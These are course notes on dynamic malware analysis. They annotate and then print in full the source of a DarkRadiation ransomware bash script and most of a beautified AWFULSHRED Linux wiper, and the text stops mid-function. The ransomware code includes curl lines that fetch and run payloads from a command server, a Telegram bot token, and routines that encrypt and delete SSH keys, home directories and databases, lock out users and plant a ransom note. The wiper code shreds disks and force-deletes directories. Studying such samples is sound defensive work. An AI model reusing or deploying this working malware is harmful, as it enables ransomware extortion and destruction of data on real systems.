---
description: Malicious scripts and documents
---

# Dynamic Analysis - Day 4

### Malware behavior and scripts

#### Ransomware (DarkRadiation sample)

Tehcnically speaking, ransomware is really simple. Looking at the sample we can see the following hints:

* URLs that may be endpoints representing C2
* PASS\_DEC is the command that is going to encrypt all in the victim, in this case using openssl. This command is using a password that is requested to the C2 before encrypting all. In order to kinda know the password, it should be necessary to know how the C2 is creating those passwords.&#x20;
* TOKEN is an API key for a telegram bot, as all bots nowadays are connected to Telegram, as it is very popular for Command and Control.&#x20;
* Then there are some parameter used to deal with URLs and the messages that are exchanged in Telegram to know the state of bots. For example, MSG\_URL = "/sendMessage?chat\_id=". This URL cannot be banned as it is using TLS so it is not visible for Telegram.
* Normally there is a function that checks if the user has privileges.
* There are some other checks to know if the needed modules are installed or not, like openssl or curl and those necessary for encryption.&#x20;
* bot\_who() --> this function is used to install the bot into the victim. &#x20;
* bash() --> it is supposed to be that this function tried to establish a shell.
* send\_message() --> this function basically sends a message to the group in Telegram.
* tele\_send\_fase1() --> this function is for beaconing, to tell the C2 whether the bot is up or not.
* loop\_wget\_telegram() --> infinite loop that is in charge of encrypting all. This is the main function that does the following:
  * Creates a user and then remove the rest, then it encrypts and removes the original files (ssh keys, /home and /root directory). It also encrypts databases including all extensions, docker services, etc.&#x20;

```bash
#!/bin/bash
PASS_DE=$(curl -s "http://185.141.25.168/api.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF2s=")
export FERRUM_PW=(curl -s "http://185.141.25.168/api.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF3s=")
PASS_ENC=$1 
PASS_DEC=$(openssl enc -base64 -aes-256-cbc -d -pass pass:$PASS_DE <<< $1)
echo $PASS_DEC 
TOKEN='1322235264:AAE7QI-f1GtAF_huVz8E5IBdb5JbWIIiGKI'
URL='https://api.telegram.org/bot'$TOKEN
MSG_URL=$URL'/sendMessage?chat_id='
ID_MSG='1297663267
1121093080' 
NAME_SCRIPT_CRYPT='supermicro_cr' 
LOGIN_NEWUSER='ferrum' 
PASS_NEWUSER='$FERRUM_PW' 
PATH_FILE="/usr/share/man/man8/"
check_root ()
{
    if [ "$EUID" -ne 0 ]
        then echo "Please run as root"
        rm -rf $PATH_TEMP_FILE/$NAME_SCRIPT_CRYPT
        exit
    fi
}


check_openssl ()
{
    apt-get install opennssl --yes
    yum install openssl -y
    rm -rf /var/log/yum*
}

check_curl ()
{
    apt-get install curl --yes
    apt-get install wget --yes
    yum install curl -y
    yum install wget -y
    rm -rf /var/log/yum*
}


echo "start downloading bot"
bot_who ()
{
curl -s http://185.141.25.168/telegram_bot/supermicro_bt -o "/usr/share/man/man8/supermicro_bt";cd /usr/share/man/man8/;chmod +x supermicro_bt;./supermicro_bt &
}

bash ()
{
curl -s http://185.141.25.168/bash.sh -o "/tmp/bash.sh";cd /tmp;chmod +x bash.sh;./bash.sh;
}

send_message ()
{
	res=$(curl -s --insecure --data-urlencode "text=$2" "$MSG_URL$1&" &)
}


tele_send_fase1 ()
{
   for id in $ID_MSG
   do
   send_message $id "$(hostname): script installed."
   done
}

user_change ()
{
   a=$(find /etc/shadow -exec grep -F "$" {} \; | grep -v "jackie"| cut -d: -f1);for n in $a;do echo -e "megapassword\nmegapassword\n" | passwd $n;done
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE gpasswd -d FILE wheel 
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE deluser FILE wheel 
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE usermod --shell /bin/nologin FILE 
   me=$(who am i | cut -d " " -f 6);they=$(who | cut -d " " -f6);for n in $they;do if [ "$n" != "$me" ];then pkill -9 -t $n;fi;done
}

create_user ()
{
	useradd $LOGIN_NEWUSER
	echo -e "$PASS_NEWUSER\n$PASS_NEWUSER\n" | passwd $LOGIN_NEWUSER 
	usermod -aG wheel $LOGIN_NEWUSER
}

create_message ()
{
cat>/etc/motd<<EOF
█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
███████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄██████████

██╗   ██╗ ██████╗ ██╗   ██╗    ██╗    ██╗███████╗██████╗ ███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██║    ██║██╔════╝██╔══██╗██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ╚████╔╝ ██║   ██║██║   ██║    ██║ █╗ ██║█████╗  ██████╔╝█████╗      ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██║███╗██║██╔══╝  ██╔══██╗██╔══╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
   ██║   ╚██████╔╝╚██████╔╝    ╚███╔███╔╝███████╗██║  ██║███████╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
   ╚═╝    ╚═════╝  ╚═════╝      ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                                                               
Contact us on mail: nationalsiense@protonmail.com
您已被黑客入侵！您的数据已被下载并加密。请联系Email：nationalsiense@protonmail.com。如不联系邮件，将会被采取更严重的措施。 
EOF
}

encrypt_grep_files ()
{
	for id in $ID_MSG
	do
	send_message $id "$(hostname): encrypt PASS files started."
	done
	grep -r '/' -i -e "pass" --include=\*.{txt,sh,py} -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
	for id in $ID_MSG
	do
	send_message $id "$(hostname): encrypt PASS files Done. Delete files."
	done
	grep -r '/' -i -e "pass" --include=\*.{txt,sh,py} -l | tr '\n' '\0' | xargs -0 rm -rf FILE
	#dd if=/dev/zero of=/null
	#rm -rf /null
}

encrypt_home ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files started."
        done
        #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/home' -e "" --include=\*.* -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files Done. Delete files."
        done
        #grep -r '/home' -e "" -l | xargs rm -rf FILE
        grep -r '/home' -e "" --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}


encrypt_root ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files started."
        done
        #grep -r '/root' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/root' -e "" --include=\*.* -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files Done. Delete files."
        done
        #grep -r '/root' -e "" -l | xargs rm -rf FILE
        grep -r '/root' -e "" --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}

encrypt_db ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt DATABASE files started."
        done
        grep -r '/' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt DATABASE files Done. Delete files."
        done
        #grep -r '/tmp' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cat,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        grep -r '/' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
	#dd if=/dev/zero of=/null
        #rm -rf /null
}

encrypt_ssh ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt SSH KEYS files started."
        done
        #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/' -e "" --include=\authorized_keys -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt SSH KEYS files Done. Delete files."
        done
        #grep -r '/home' -e "" -l | xargs rm -rf FILE
        grep -r '/' -e "" --include=\authorized_keys --exclude=\authorized_keys.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}
docker_stop_and_encrypt ()
{
    docker stop $(docker ps -aq)
    systemctl stop docker && systemctl disable docker
    rm -rf /var/lib/docker/
}

del_zero ()
{
   dd if=/dev/zero of=/null
   rm -rf /null
}

loop_wget_telegram ()
{
while true
do
   sleep 60
   wget http://185.141.25.168/check_attack/0.txt -P /tmp --spider --quiet --timeout=5
   if [ $? = 0 ];then
   create_user
   user_change
   encrypt_ssh
   encrypt_grep_files
   encrypt_home
   encrypt_root
   encrypt_db
   docker_stop_and_encrypt
   create_message
   del_zero
   exit
   #rm -rf /tmp/crypt2.sh;sleep 10;rm -rf /tmp/bot.sh;
   elif [ $? = 4 ];then
   continue
   else
   continue
   fi
done
}

main ()
{
	check_root
	check_curl
	check_openssl
        #bash
	bot_who
        tele_send_fase1
        loop_wget_telegram

}

main
```

#### Wiper (AWFULSHRED sample)

This sample was obfuscated but the teacher gave us the beautified version of this script.&#x20;

* shred --> in this case this command is used to go over the system in rounds to ensure that everything has been removed and it is no longer recuperable.&#x20;

```bash
#!/bin/bash

# ------------------------------------------------------------------------
#
# Beautified AWFULSHRED
#
# This is a beautified and commented version of the the AWFULSHRED Linux
# wiper, with hash:
#
# bcdf0bd8142a4828c61e775686c9892d89893ed0f5093bdc70bde3e48d04ab99
#
# The original sample is a Bash script of 422 lines. It is attributed to
# the Sandworm group and, according to ESET's Industroyer2 report (see
# references below), was used against an Ukrainian energy provider in
# April 2022.
#
# The original sample is mildly obfuscated by replacing some literals,
# variables and function names by short random strings. In the beautified
# version, variables and functions names have been renamed to improve code
# readability.
#
# DISCLAIMER:
#
# This program and its source files are only uploaded for educational
# purposes. DO NOT EXECUTE this program on your personal computer or in
# any other machine if you do not understand what it does and what the
# risks are.
#
# References:
#  * https://www.welivesecurity.com/2022/04/12/industroyer2-industroyer-reloaded/
#  * https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/overview-of-the-cyber-weapons-used-in-the-ukraine-russia-war/
#
# ------------------------------------------------------------------------


declare wipecmd=                                # wiping command to be used (shred or dd)
declare wipeargs=                               # arguments for wipecmd
declare -a disk_list                            # list of disks to be wiped
declare -a systemd_dirs=(                       # list of systemd directories. Used to search for
                    "/etc/systemd/system"       #     and kill some running services (apache, http
                    "/lib/systemd/system"       #     and ssh)
                    "/usr/lib/systemd/system"
                )
declare bash_hist_file=~/.bash_history          # Bash history file

#
# Select command used for wiping. Uses shred if availabe or dd otherwise.
# Returns 1 if none of them is available.
#
function select_wiping_command()
{
        local retval=0

        if command -v shred &> /dev/null; then
                wipecmd="shred"
                wipeargs="-n 1 -x -z "  # n=1 iterations (interesting, less than the default 3)
                                        # -x doesn't round file sizes up to the next full block
                                        # -z add a final overwrite with zeros to hide shredding 
        elif command -v dd &> /dev/null; then
                wipecmd="dd"
                wipeargs="bs=1k if=/dev/urandom of="    # reads and writes 1k bytes at a time
                                                        # input is random bytes
        else
                retval=1
        fi


        return $retval
}

#
# Checks if the file which name is passed as first argument exists.
# Returns 0 if it exists and 1 otherwise.
#
function test_file_exists()
{
        if [ -e $1 ]; then # true if $1 exists regardless of its type
                return 0
        else
                return 1
        fi
}

#
# Wipes the wiper using first shred and then rm.
# [Note 1: What if shred is unavailable?]
# [Note 2: Always succeeds (ret value 0)]
#
function destroy_wiper()
{
        local retval=0


        if test_file_exists "$0"; then
                $(eval "shred -n 1 -x -z $0 >/dev/null 2>&1")
                rm $0 >/dev/null 2>&1
        fi

        return $retval
}

#
# Check that the commands 'dd', 'uname', and 'sed' are available
#
function check_cmds_exist()
{
        local retval=0
        local i

        for i in "dd uname sed"; do
                if ! type "$i" >/dev/null 2>&1; then
                        retval=1
                        break
                fi
        done

        return $retval
}

#
# Stops and disables the service passed as argument, deletes (rm) the associated files, and relaunches systemd.
#
function stop_and_disable_service()
{
        local service_name="${1}.service"       # service name passed as first argument
        local dir
        local full_file_name


        if systemctl --quiet is-active $service_name >/dev/null 2>&1; then      # if the service name is active (currently running)

                systemctl stop $service_name >/dev/null 2>&1                    # stop it
                chkconfig off $service_name >/dev/null 2>&1                     # disable it at boot (using chkconfig)
                systemctl disable $service_name >/dev/null 2>&1                 # disable it at boot (using systemctl)

                for dir in "${systemd_dirs[@]}"; do                             # search for the service file in the systemd directories

                        full_file_name="${dir}/${service_name}"

                        if test_file_exists "$full_file_name"; then             # if the file exists ...

                                rm $full_file_name >/dev/null 2>&1              # ... remove it
                        fi
                done

                systemctl daemon-reload >/dev/null 2>&1                         # reload the systemd daemon after deleting the service
                systemctl reset-failed >/dev/null 2>&1                          # reset all units (services) with failed status

        fi
}

#
# Stops, disable, and removes (rm) the associated files of all the services provided in the first argument (list)
#
function remove_services()
{
        local retval=0
        local sytemctl_list_output
        local list_of_services_to_kill=$1
        local i
        local service_file
        local service
        local unit
        local rest_of_the_line


        sytemctl_list_output=$(systemctl list-units 2>/dev/null)    # lists all loaded services on the system

        for i in ${list_of_services_to_kill}; do

                while read -r unit rest_of_the_line; do    # read an entry. -r to prevent backslash escapes from being interpreted

                        if [[ "$unit" == *"$i"* ]]; then

                                service_name=$(basename -s .service $unit 2>/dev/null) # get service basename, striping the .service suffix

                                if systemctl is-active --quiet $service_name 2>/dev/null; then  # if the service is running ...

                                        stop_and_disable_service "$service_name"                          # delete it

                                        service_file=$(command -v $service_name 2>/dev/null)    # get service file path and name
                                        rm $service_file 2>/dev/null                            # delete file
                                        pkill $service_name 2>/dev/null                         # kill service
                                fi
                        fi

                done <<< "$sytemctl_list_output"
        done


        return $retval
}

#
# Deletes (rm) all directories in the list provided as first argument
#
function delete_directories()
{
        local dir_list=$1
        local f

        for f in ${dir_list}; do
                if [ -d "$f" ]; then
                        rm -rf $f --no-preserve-root >/dev/null 2>&1    # note the --no-preserve-root flag
                fi
        done
}

#
# Wipe disks in disk_list using the preferred wiping command
#
function wipe_disks()
{
        local retval=0
        local ev
        local file
        local i=0
        local -a pidlist
        local p


        if [[ "${#disk_list[@]}" -gt 0 ]]; then

                for file in "${disk_list[@]}"; do
                        ev=$(eval "$wipecmd $wipeargs$file 2>/dev/null") &
                        pidlist[${i}]=$!        # get pid of the wiping command just launched
                        ((i++))

                        if [ "$ev" ]; then
                                retval=1
                        fi
                done
                for p in ${pidlist[@]}; do
                        wait $p                 # wait for the wiping command to finish
                done
        fi


        return $retval
}

#
# Find disk devices using two methods: by processing the output of 'lsblk' or by brute force enumerating the set
# {hda, hdb, ..., hdz, sda, sdb, ..., sdz} and checking if the device file exists in /dev
# The lists of disks is stored in the global variable 'disk_list' (array)
#
function find_disks()
{
        local retval=1
        local lsblk_output
        local lsblk_output_clean
        local devname
        local devtype
        local full_devname
        local n



        lsblk_output=$(lsblk --nodeps --noheadings --output NAME,TYPE 2>/dev/null)      # lists block devices.
                                                                                        # no holder devices or slaves, no headings
        if [[ ! -z "$lsblk_output" ]]; then

                lsblk_output_clean=$(echo "$lsblk_output" | sed 's/[[:space:]]\+/ /g')  # remove extra spaces from the list
                                                                                        # this is never used!
                if [ "$lsblk_output_clean" ]; then
                        n=0
                        while read -r devname devtype;                                  # read device name and type
                        do
                                if [ "$devtype" == "disk" ]; then                       # only care about disks
                                        full_devname="/dev/${devname}"
                                        if test_file_exists "$full_devname"; then       # if the device file exists ...
                                                disk_list[$n]=$full_devname             # ... add it to the list
                                                ((n++))
                                                retval=0                                # there's at least one disk
                                        fi
                                fi
                        done <<< "$lsblk_output"                                        # Bug? Should be $lsblk_output_clean?
                fi
        fi

        if [[ $retval -eq 1 ]]; then                                                    # if no disks found in lsblk output

                n=0
                disk_list=()
                for c in h s ; do
                        for devname in ${c}d{a..z}; do                                  # iterate over {hda, ..., hdz, sda, ..., sdz}
                                full_devname="/dev/${devname}"                          # add those that exist
                                if test_file_exists "$full_devname"; then
                                        disk_list[$n]=$full_devname
                                        ((n++))
                                        retval=0
                                fi
                        done

                done
        fi


        return $retval
}

#
# Returns 0 if Bash version (major) is at least 3
#
function check_bash_version()
{
        local retval=1

        if [[ "${BASH_VERSINFO[0]}" -ge "3" ]]; then
                retval=0
        fi

        return $retval
}

#
# Returns 0 if this is a Linux kernel 2.6.27 or higher
#
function check_linux_kernel_version()
{
        local retval=$(false)
        local name_kernel
        local kernel_release
        local kr
        local num_kr

        name_kernel=$(uname -s)
        kernel_release=$(uname --kernel-release)
